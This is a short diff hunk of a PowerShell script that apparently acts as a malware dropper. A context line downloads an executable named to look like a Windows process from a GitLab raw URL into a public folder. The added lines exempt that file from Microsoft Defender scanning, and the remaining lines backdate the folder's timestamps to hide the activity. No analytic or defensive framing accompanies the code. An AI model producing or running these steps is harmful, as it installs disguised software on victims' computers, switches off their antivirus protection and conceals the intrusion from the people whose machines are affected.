@@ -6,6 +6,8 @@ Invoke-WebRequest -Uri "https://gitlab.com/cs980414/cs/-/raw/main/taskhostk.exe"
 
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl.exe"
 
+Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\taskhostk.exe"
+
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:09")
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name CreationTime -Value (Get-Date "2024-12-13 14:23:08")
